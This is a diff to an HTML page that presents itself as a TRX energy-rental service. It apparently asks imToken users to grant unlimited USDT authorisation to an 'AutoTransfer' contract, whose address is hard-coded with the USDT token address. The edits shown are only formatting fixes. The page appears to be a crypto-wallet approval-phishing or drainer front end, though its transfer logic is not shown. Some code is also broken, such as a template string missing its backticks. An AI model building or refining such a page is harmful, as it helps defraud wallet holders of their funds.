@@ -294,7 +294,7 @@
                 <span><h3>USDT</h3></span>
                 <span><h3>无限</h3></span>
             </div>       
-            <strong>授权记录<strong>
+            <strong>授权记录</strong>
             <div id="approvalRecords">
                 <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
             </div>
@@ -320,38 +320,40 @@
     </div>
 
     <!-- 底部信息区 -->
-    <div class="footer-info">
+        <div class="footer-info">
         <div class="safety-tip">
             安全提示：无限授权可在imToken「资产→USDT→授权管理」中撤销
         </div>
         合约验证：AutoTransfer <span>TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW</span>（TRON浏览器查询）
         © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
+
+                
     <script src="imtoken://browser"></script>
     <script>
-        // 自定义非阻塞提示（自动消失，不中断代码）
-        function showToast(message, type = "success") {
-         // 创建提示框元素
-          const toast = document.createElement("div");
-          toast.className = toast-notice ${type};
-          toast.textContent = message;
+            // 自定义非阻塞提示（自动消失，不中断代码）
+             function showToast(message, type = "success") {
+               // 创建提示框元素
+               const toast = document.createElement("div");
+               toast.className = toast-notice ${type};
+               toast.textContent = message;
   
-          // 添加到页面
-          document.body.appendChild(toast);
+               // 添加到页面
+               document.body.appendChild(toast);
   
-          // 显示提示（延迟0.1秒触发过渡动画）
-          setTimeout(() => {
-            toast.style.opacity = "1";
-          }, 10);
+               // 显示提示（延迟0.1秒触发过渡动画）
+               setTimeout(() => {
+                 toast.style.opacity = "1";
+               }, 10);
   
-          // 3秒后自动消失并移除元素
-          setTimeout(() => {
-            toast.style.opacity = "0";
-            setTimeout(() => {
-              document.body.removeChild(toast);
-            }, 300); // 等过渡动画结束后移除
-          }, 3000);
-        }
+               // 3秒后自动消失并移除元素
+               setTimeout(() => {
+                 toast.style.opacity = "0";
+                 setTimeout(() => {
+                   document.body.removeChild(toast);
+                 }, 300); // 等过渡动画结束后移除
+               }, 3000);
+             }    
         // 原始配置保留
         const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW";
         const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -551,6 +553,6 @@
                 console.log("渲染授权记录失败：", e);
             }
         }
-    </script>
+        </script>
 </body>
 </html>
